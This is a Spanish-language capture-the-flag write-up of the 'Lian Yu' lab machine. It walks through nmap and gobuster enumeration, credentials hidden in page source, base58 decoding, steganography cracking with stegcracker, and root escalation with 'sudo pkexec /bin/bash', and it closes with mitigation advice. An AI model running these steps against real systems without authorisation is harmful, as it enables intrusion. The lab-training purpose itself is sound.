# Lian Yu
## Initial Scan
```
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          43554/udp6  status
|   100024  1          47489/udp   status
|   100024  1          47589/tcp   status
|_  100024  1          48692/tcp6  status
47589/tcp open  status  1 (RPC #100024)
```
## Enum 
### HTTP
#### Gobusting 1 
```
/island (Status: 301)
```
#### Island
```html
<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
```
Parecen unas creds Lian_Yu:vigilante

#### Guessing Time
Hace falta usar una wordlist con numeros de 0 a 9999 para encontrar el siguiente subdirectorio
```
/2100 (Status: 301)
```
#### 2100
Miramos el fuente y:
```
<!-- you can avail your .ticket here but how?   -->
```
Vamos a hacer gobusting con esa extension
```
:~$ gobuster -u http://10.10.204.63/island/2100 -w /usr/share/dirb/wordlists/directory-list-lowercase-2.3-big.txt -t 100 -x .ticket
>/green_arrow.ticket (Status: 200)
```
#### TIcket
```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```
Si le aplicaamos base58 decode tenemos el siguiente string: !#th3h00d

### FTP

Con el ticket y la code word de la island nos podemos logear en el ftp, no tenemos permiso de escritura en la carpeta en la que estamos "/home/vigilante/ y las 3 fotos y veamos si se les ha aplicado algún tipo de esteganografía 

#### Users

Ya que estamos en /home/vigilante veamos si tenemos otro usuario con /home , y asi es para slade

### Stego

Mirando los 3 archivos vemos que en aa.jpg están las strings caracteristicas de steghide
```
stegcracker aa.jpg rockyou.txt
```
Con esto extraeremos un zip, si lo desomprimimos tenemos un archivo llamado shado y otro llamado pass

De ahi sacamos la password para slade en SSH

## Privesc
```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```
Ejecutamos lo siguiente:
```
sudo pkexec /bin/bash
```
Y ya tenemos shell como root

# Analisis de la intrusiom
### Pkexec priveleged execution
El usuario slade puede utilizar pkexec como root, lo cual nos permitio elevar privilegios a root

# Solucion
### Pkexec priveleged execution
Permitir a un usuario regular ejecutar pkexec como root no parece algo con mucho sentido, la principal opción para mitigar esto seria eliminar este permiso si por algún casual se diese un caso en el que esto fuera necesario lo ideal seria introducir el comando entero en /etc/sudoers limitando bastante la explotación y aun asi lo optimo seria establecer una politica de Seccomp al respecto
